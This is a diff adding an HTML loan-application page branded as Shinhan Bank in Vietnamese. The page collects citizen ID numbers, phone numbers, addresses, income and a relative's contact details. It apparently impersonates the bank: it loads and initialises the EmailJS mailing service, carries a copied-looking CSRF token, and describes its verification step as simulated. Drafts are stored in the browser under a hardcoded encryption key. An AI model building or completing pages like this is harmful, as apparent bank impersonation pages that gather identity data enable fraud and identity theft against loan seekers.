@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="csrf-token" content="flBZzgVCzEBmPwoEyekJgpET4VkG6FCAU6WnPQta">
+    <title>Đăng Ký Vay - Ngân hàng Shinhan</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f5f8fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            text-align: center;
+            padding: 20px;
+        }
+        h3 {
+            color: #004b8d;
+            font-size: 1.4rem;
+            margin: 15px 0 10px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin: 8px 0 5px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+            position: relative;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .radio-group {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal.active {
+            display: flex !important;
+        }
+        .modal-content {
+            background-color: white;
+            padding: 15px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 600px;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .close-btn {
+            float: right;
+            font-size: 20px;
+            cursor: pointer;
+            color: #004b8d;
+        }
+        .form-actions {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .form-actions button {
+            padding: 12px 24px;
+            background-color: #f28c38;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+        .form-actions button:hover {
+            background-color: #d97a30;
+            transform: scale(1.05);
+        }
+        .error {
+            color: #d32f2f;
+            font-size: 14px;
+            text-align: left;
+            margin-top: -10px;
+            margin-bottom: 10px;
+        }
+        .error-summary {
+            color: #d32f2f;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .tooltip {
+            position: absolute;
+            right: 5px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #004b8d;
+            cursor: pointer;
+        }
+        .tooltip-text {
+            display: none;
+            position: absolute;
+            background-color: #333;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            top: 100%;
+            right: 0;
+            z-index: 10;
+        }
+        .tooltip:hover .tooltip-text {
+            display: block;
+        }
+        #registerForm {
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            border: 1px solid #e6f0fa;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div style="text-align: center; margin-bottom: 40px;">
+            <a href="javascript:void(0)" onclick="openRegisterModal()" style="display: inline-block; font-weight: bold; text-decoration: none; background: linear-gradient(#f18b53, #f57a27, #e66c18); color: white; padding: 12px 30px; border-radius: 13px; box-shadow: 2px 3px 8px 1px #8c8c8c; text-transform: uppercase; font-size: 1.1rem; line-height: 16px;">ĐĂNG KÝ NGAY</a>
+        </div>
+        <div class="modal" id="registerModal">
+            <div class="modal-content">
+                <span class="close-btn" onclick="closeRegisterModal()">×</span>
+                <h3>Đăng Ký Vay</h3>
+                <form id="registerForm">
+                    <label for="branch">Chi nhánh<span class="tooltip">?<span class="tooltip-text">Chọn chi nhánh Shinhan gần nhất để hỗ trợ bạn.</span></span></label>
+                    <select id="branch">
+                        <option value="">Chọn chi nhánh</option>
+                        <option value="HCM">Hồ Chí Minh</option>
+                        <option value="HN">Hà Nội</option>
+                        <option value="DN">Đà Nẵng</option>
+                        <option value="CT">Cần Thơ</option>
+                    </select>
+                    <div id="branchError" class="error"></div>
+                    <label for="fullName">Họ và tên<span class="tooltip">?<span class="tooltip-text">Nhập đầy đủ họ và tên như trên CCCD.</span></span></label>
+                    <input type="text" id="fullName" placeholder="Ví dụ: Nguyễn Văn A">
+                    <div id="fullNameError" class="error"></div>
+                    <label>Giới tính<span class="tooltip">?<span class="tooltip-text">Chọn giới tính của bạn.</span></span></label>
+                    <div class="radio-group">
+                        <label><input type="radio" name="gender" value="male"> Nam</label>
+                        <label><input type="radio" name="gender" value="female"> Nữ</label>
+                    </div>
+                    <div id="genderError" class="error"></div>
+                    <label for="birthDate">Ngày sinh<span class="tooltip">?<span class="tooltip-text">Độ tuổi từ 18 đến 65.</span></span></label>
+                    <input type="date" id="birthDate">
+                    <div id="birthDateError" class="error"></div>
+                    <label for="idNumber">Số CMND/CCCD<span class="tooltip">?<span class="tooltip-text">Nhập số CCCD 12 số.</span></span></label>
+                    <input type="text" id="idNumber" placeholder="Ví dụ: 123456789012">
+                    <div id="idNumberError" class="error"></div>
+                    <label for="phone">Số điện thoại<span class="tooltip">?<span class="tooltip-text">Số điện thoại 10 số, bắt đầu bằng 0.</span></span></label>
+                    <input type="text" id="phone" placeholder="Ví dụ: 0901234567">
+                    <div id="phoneError" class="error"></div>
+                    <label for="hometown">Quê quán<span class="tooltip">?<span class="tooltip-text">Nhập địa chỉ quê quán như trên CCCD.</span></span></label>
+                    <input type="text" id="hometown" placeholder="Ví dụ: Quận 1, TP.HCM">
+                    <div id="hometownError" class="error"></div>
+                    <label for="residence">Nơi thường trú<span class="tooltip">?<span class="tooltip-text">Nhập địa chỉ thường trú hiện tại.</span></span></label>
+                    <input type="text" id="residence" placeholder="Ví dụ: Quận 7, TP.HCM">
+                    <div id="residenceError" class="error"></div>
+                    <label for="income">Thu nhập hàng tháng (VND)<span class="tooltip">?<span class="tooltip-text">Thu nhập tối thiểu 4 triệu VND.</span></span></label>
+                    <input type="number" id="income" placeholder="Ví dụ: 4000000">
+                    <div id="incomeError" class="error"></div>
+                    <label for="job">Công việc hiện tại<span class="tooltip">?<span class="tooltip-text">Nhập công việc hoặc ngành nghề của bạn.</span></span></label>
+                    <input type="text" id="job" placeholder="Ví dụ: Nhân viên văn phòng">
+                    <div id="jobError" class="error"></div>
+                    <label for="relativePhone">Số điện thoại người thân<span class="tooltip">?<span class="tooltip-text">Số điện thoại 10 số, không trùng số chính.</span></span></label>
+                    <input type="text" id="relativePhone" placeholder="Ví dụ: 0901234567">
+                    <div id="relativePhoneError" class="error"></div>
+                    <label for="relativeName">Tên người thân<span class="tooltip">?<span class="tooltip-text">Nhập tên đầy đủ của người thân.</span></span></label>
+                    <input type="text" id="relativeName" placeholder="Ví dụ: Nguyễn Thị B">
+                    <div id="relativeNameError" class="error"></div>
+                    <label>Hình thức vay<span class="tooltip">?<span class="tooltip-text">Chọn hình thức vay phù hợp.</span></span></label>
+                    <div class="radio-group">
+                        <label><input type="radio" name="loanForm" value="online">Trực tuyến</label>
+                        <label><input type="radio" name="loanForm" value="offline">Tại chi nhánh</label>
+                    </div>
+                    <div id="loanFormError" class="error"></div>
+                    <label>Đối tượng khách hàng<span class="tooltip">?<span class="tooltip-text">Chọn loại khách hàng của bạn.</span></span></label>
+                    <div class="radio-group">
+                        <label><input type="radio" name="customerType" value="new">Khách hàng mới</label>
+                        <label><input type="radio" name="customerType" value="existing">Khách hàng hiện tại</label>
+                    </div>
+                    <div id="customerTypeError" class="error"></div>
+                    <label for="registerLoanType">Loại khoản vay<span class="tooltip">?<span class="tooltip-text">Chọn loại khoản vay phù hợp.</span></span></label>
+                    <select id="registerLoanType">
+                        <option value="">Chọn loại khoản vay</option>
+                        <option value="tinchap">Vay tín chấp</option>
+                        <option value="digital_tinchap">Vay tín chấp số</option>
+                        <option value="thechap_nha">Vay thế chấp mua nhà</option>
+                        <option value="thechap_xe">Vay thế chấp mua xe</option>
+                        <option value="thechap_xe_cu">Vay thế chấp xe đã qua sử dụng</option>
+                        <option value="tai_nha">Vay tái tài trợ nhà</option>
+                        <option value="dam_bao">Vay đảm bảo bán lẻ (SGI)</option>
+                    </select>
+                    <div id="registerLoanTypeError" class="error"></div>
+                    <label for="registerAmount">Số tiền vay (VND)<span class="tooltip">?<span class="tooltip-text">Nhập số tiền vay, tối thiểu 10 triệu VND.</span></span></label>
+                    <input type="text" id="registerAmount" oninput="formatNumber(this); validateAmount(this)" placeholder="Ví dụ: 100,000,000">
+                    <div id="registerAmountError" class="error"></div>
+                    <label for="registerTerm">Thời hạn vay (tháng)<span class="tooltip">?<span class="tooltip-text">Chọn thời gian trả nợ, từ 6 đến 120 tháng tùy gói vay.</span></span></label>
+                    <select id="registerTerm">
+                        <option value="">Chọn thời hạn</option>
+                        <option value="6">6 tháng</option>
+                        <option value="12">12 tháng</option>
+                        <option value="24">24 tháng</option>
+                        <option value="36">36 tháng</option>
+                        <option value="48">48 tháng</option>
+                        <option value="60">60 tháng</option>
+                        <option value="72">72 tháng</option>
+                        <option value="84">84 tháng</option>
+                        <option value="96">96 tháng</option>
+                        <option value="108">108 tháng</option>
+                        <option value="120">120 tháng</option>
+                    </select>
+                    <div id="registerTermError" class="error"></div>
+                    <div id="registerErrorSummary" class="error-summary"></div>
+                    <div class="form-actions">
+                        <button type="button" onclick="saveDraft()">Lưu nháp</button>
+                        <button type="button" onclick="nextToVerify()">Tiếp tục</button>
+                        <button type="button" onclick="closeRegisterModal()">Đóng</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    <script>
+        // Khởi tạo EmailJS
+        emailjs.init("Cc-147hLWigAZAdeZ");
+
+        // Biến lưu trữ tạm dữ liệu form
+        let tempFormData = {};
+
+        // Hàm mở modal
+        function openRegisterModal() {
+            document.getElementById('registerModal').style.display = 'flex';
+            document.getElementById('registerModal').classList.add('active');
+            loadDraft();
+        }
+
+        // Hàm đóng modal
+        function closeRegisterModal() {
+            document.getElementById('registerModal').style.display = 'none';
+            document.getElementById('registerModal').classList.remove('active');
+            document.getElementById('registerForm').reset();
+            clearErrors();
+            tempFormData = {};
+        }
+
+        // Hàm định dạng số tiền
+        function formatNumber(input) {
+            let value = input.value.replace(/[^0-9]/g, '');
+            let numericValue = parseInt(value, 10);
+            if (!isNaN(numericValue)) {
+                input.value = numericValue.toLocaleString('vi-VN');
+            } else {
+                input.value = '';
+            }
+        }
+
+        // Hàm bỏ định dạng
+        function unformatNumber(value) {
+            let numericValue = parseInt(value.replace(/[^0-9]/g, ''), 10);
+            return isNaN(numericValue) ? 0 : numericValue;
+        }
+
+        // Kiểm tra số tiền vay
+        function validateAmount(input) {
+            let value = unformatNumber(input.value);
+            const loanType = document.getElementById('registerLoanType').value;
+            const limits = {
+                tinchap: 900000000,
+                digital_tinchap: 100000000,
+                thechap_nha: 5000000000,
+                thechap_xe: 2000000000,
+                thechap_xe_cu: 2000000000,
+                tai_nha: 5000000000,
+                dam_bao: 1000000000
+            };
+            if (value < 10000000) {
+                document.getElementById(input.id + 'Error').innerText = 'Số tiền vay tối thiểu 10 triệu VND.';
+            } else if (loanType && value > limits[loanType]) {
+                document.getElementById(input.id + 'Error').innerText = `Số tiền tối đa cho ${loanType} là ${limits[loanType].toLocaleString('vi-VN')} VND.`;
+            } else {
+                document.getElementById(input.id + 'Error').innerText = '';
+            }
+        }
+
+        // Kiểm tra số CMND/CCCD
+        function validateIdNumber(idNumber) {
+            const provinceCodes = ['001', '002', '004', '006', '008', '010', '011', '012', '014', '015', '017', '019', '020', '022', '024', '025', '026', '027', '030', '031', '033', '034', '035', '036', '037', '038', '040', '042', '044', '045', '046', '048', '049', '051', '052', '054', '056', '058', '060', '062', '064', '066', '067', '068', '070', '072', '074', '075', '077', '079', '080', '082', '083', '084', '086', '087', '089', '091', '092', '093', '094', '095', '096'];
+            return /^\d{12}$/.test(idNumber) && provinceCodes.includes(idNumber.slice(0, 3));
+        }
+
+        // Xóa lỗi
+        function clearErrors() {
+            const errorIds = ['branchError', 'fullNameError', 'birthDateError', 'idNumberError', 'phoneError', 'hometownError', 'residenceError', 'incomeError', 'jobError', 'relativePhoneError', 'relativeNameError', 'loanFormError', 'customerTypeError', 'registerLoanTypeError', 'registerAmountError', 'registerTermError', 'genderError'];
+            errorIds.forEach(id => {
+                const element = document.getElementById(id);
+                if (element) element.innerText = '';
+            });
+            const summary = document.getElementById('registerErrorSummary');
+            if (summary) summary.innerText = '';
+        }
+
+        // Kiểm tra form đăng ký
+        function validateRegisterForm() {
+            const branch = document.getElementById('branch').value;
+            const fullName = document.getElementById('fullName').value.trim();
+            const gender = document.querySelector('input[name="gender"]:checked');
+            const birthDate = document.getElementById('birthDate').value;
+            const idNumber = document.getElementById('idNumber').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const hometown = document.getElementById('hometown').value.trim();
+            const residence = document.getElementById('residence').value.trim();
+            const income = parseFloat(document.getElementById('income').value);
+            const job = document.getElementById('job').value.trim();
+            const relativePhone = document.getElementById('relativePhone').value.trim();
+            const relativeName = document.getElementById('relativeName').value.trim();
+            const loanForm = document.querySelector('input[name="loanForm"]:checked');
+            const customerType = document.querySelector('input[name="customerType"]:checked');
+            const loanType = document.getElementById('registerLoanType').value;
+            const amount = unformatNumber(document.getElementById('registerAmount').value);
+            const term = parseInt(document.getElementById('registerTerm').value);
+
+            let errors = {};
+            if (!branch) errors.branch = 'Vui lòng chọn chi nhánh.';
+            if (!fullName || fullName.length < 2) errors.fullName = 'Họ và tên phải có ít nhất 2 ký tự.';
+            if (!gender) errors.gender = 'Vui lòng chọn giới tính.';
+            if (!birthDate) errors.birthDate = 'Vui lòng chọn ngày tháng năm sinh.';
+            else {
+                const age = new Date().getFullYear() - new Date(birthDate).getFullYear();
+                if (age < 18 || age > 65) errors.birthDate = 'Độ tuổi phải từ 18 đến 65.';
+            }
+            if (!idNumber || !validateIdNumber(idNumber)) errors.idNumber = 'Số căn cước công dân phải có 12 số và mã tỉnh hợp lệ.';
+            if (!phone || !/^\d{10}$/.test(phone) || phone[0] !== '0') errors.phone = 'Số điện thoại phải có 10 số, bắt đầu bằng 0.';
+            if (!hometown) errors.hometown = 'Vui lòng nhập quê quán.';
+            if (!residence) errors.residence = 'Vui lòng nhập nơi thường trú.';
+            if (isNaN(income) || income < 4000000) errors.income = 'Thu nhập tối thiểu 4 triệu VND.';
+            if (!job) errors.job = 'Vui lòng nhập công việc hiện tại.';
+            if (!relativePhone || !/^\d{10}$/.test(relativePhone) || relativePhone[0] !== '0') errors.relativePhone = 'Số điện thoại người thân phải có 10 số, bắt đầu bằng 0.';
+            if (relativePhone === phone) errors.relativePhone = 'Số điện thoại người thân không được trùng với số chính.';
+            if (!relativeName) errors.relativeName = 'Vui lòng nhập tên người thân.';
+            if (!loanForm) errors.loanForm = 'Vui lòng chọn hình thức vay.';
+            if (!customerType) errors.customerType = 'Vui lòng chọn đối tượng khách hàng.';
+            if (!loanType) errors.registerLoanType = 'Vui lòng chọn loại khoản vay.';
+            if (!term) errors.registerTerm = 'Vui lòng chọn thời hạn vay.';
+            const limits = {
+                tinchap: 900000000,
+                digital_tinchap: 100000000,
+                thechap_nha: 5000000000,
+                thechap_xe: 2000000000,
+                thechap_xe_cu: 2000000000,
+                tai_nha: 5000000000,
+                dam_bao: 1000000000
+            };
+            if (amount < 10000000 || (loanType && amount > limits[loanType])) {
+                errors.registerAmount = `Số tiền vay không hợp lệ cho gói ${loanType}.`;
+            }
+
+            Object.keys(errors).forEach(key => document.getElementById(`${key}Error`).innerText = errors[key]);
+            if (Object.keys(errors).length > 0) {
+                document.getElementById('registerErrorSummary').innerText = 'Vui lòng kiểm tra và điền đầy đủ thông tin.';
+            } else {
+                document.getElementById('registerErrorSummary').innerText = '';
+            }
+
+            return Object.keys(errors).length === 0;
+        }
+
+        // Lưu nháp
+        function saveDraft() {
+            const formData = {
+                branch: document.getElementById('branch').value,
+                fullName: document.getElementById('fullName').value.trim(),
+                gender: document.querySelector('input[name="gender"]:checked')?.value,
+                birthDate: document.getElementById('birthDate').value,
+                idNumber: document.getElementById('idNumber').value.trim(),
+                phone: document.getElementById('phone').value.trim(),
+                hometown: document.getElementById('hometown').value.trim(),
+                residence: document.getElementById('residence').value.trim(),
+                income: parseFloat(document.getElementById('income').value) || 0,
+                job: document.getElementById('job').value.trim(),
+                relativePhone: document.getElementById('relativePhone').value.trim(),
+                relativeName: document.getElementById('relativeName').value.trim(),
+                loanForm: document.querySelector('input[name="loanForm"]:checked')?.value,
+                customerType: document.querySelector('input[name="customerType"]:checked')?.value,
+                loanType: document.getElementById('registerLoanType').value,
+                amount: unformatNumber(document.getElementById('registerAmount').value),
+                term: parseInt(document.getElementById('registerTerm').value)
+            };
+            localStorage.setItem('draftForm', CryptoJS.AES.encrypt(JSON.stringify(formData), 'shinhan_key').toString());
+            alert('Đã lưu bản nháp.');
+        }
+
+        // Tải dữ liệu nháp
+        function loadDraft() {
+            const draft = localStorage.getItem('draftForm');
+            if (draft) {
+                const formData = JSON.parse(CryptoJS.AES.decrypt(draft, 'shinhan_key').toString(CryptoJS.enc.Utf8));
+                document.getElementById('branch').value = formData.branch || '';
+                document.getElementById('fullName').value = formData.fullName || '';
+                if (formData.gender) document.querySelector(`input[name="gender"][value="${formData.gender}"]`).checked = true;
+                document.getElementById('birthDate').value = formData.birthDate || '';
+                document.getElementById('idNumber').value = formData.idNumber || '';
+                document.getElementById('phone').value = formData.phone || '';
+                document.getElementById('hometown').value = formData.hometown || '';
+                document.getElementById('residence').value = formData.residence || '';
+                document.getElementById('income').value = formData.income || '';
+                document.getElementById('job').value = formData.job || '';
+                document.getElementById('relativePhone').value = formData.relativePhone || '';
+                document.getElementById('relativeName').value = formData.relativeName || '';
+                if (formData.loanForm) document.querySelector(`input[name="loanForm"][value="${formData.loanForm}"]`).checked = true;
+                if (formData.customerType) document.querySelector(`input[name="customerType"][value="${formData.customerType}"]`).checked = true;
+                document.getElementById('registerLoanType').value = formData.loanType || '';
+                document.getElementById('registerAmount').value = formData.amount ? formData.amount.toLocaleString('vi-VN') : '';
+                document.getElementById('registerTerm').value = formData.term || '';
+            }
+        }
+
+        // Chuyển sang bước xác minh (giả lập - cần kết nối với verify.html nếu có)
+        function nextToVerify() {
+            if (!validateRegisterForm()) return;
+            tempFormData = {
+                branch: document.getElementById('branch').value,
+                fullName: document.getElementById('fullName').value.trim(),
+                gender: document.querySelector('input[name="gender"]:checked').value,
+                birthDate: document.getElementById('birthDate').value,
+                idNumber: document.getElementById('idNumber').value.trim(),
+                phone: document.getElementById('phone').value.trim(),
+                hometown: document.getElementById('hometown').value.trim(),
+                residence: document.getElementById('residence').value.trim(),
+                income: parseFloat(document.getElementById('income').value),
+                job: document.getElementById('job').value.trim(),
+                relativePhone: document.getElementById('relativePhone').value.trim(),
+                relativeName: document.getElementById('relativeName').value.trim(),
+                loanForm: document.querySelector('input[name="loanForm"]:checked').value,
+                customerType: document.querySelector('input[name="customerType"]:checked').value,
+                loanType: document.getElementById('registerLoanType').value,
+                amount: unformatNumber(document.getElementById('registerAmount').value),
+                term: parseInt(document.getElementById('registerTerm').value)
+            };
+            alert('Đã lưu thông tin đăng ký. Chuyển sang bước xác minh (giả lập).');
+            // Nếu có verify.html, bạn có thể chuyển hướng: window.location.href = '../verify.html';
+        }
+    </script>
+</body>
+</html>
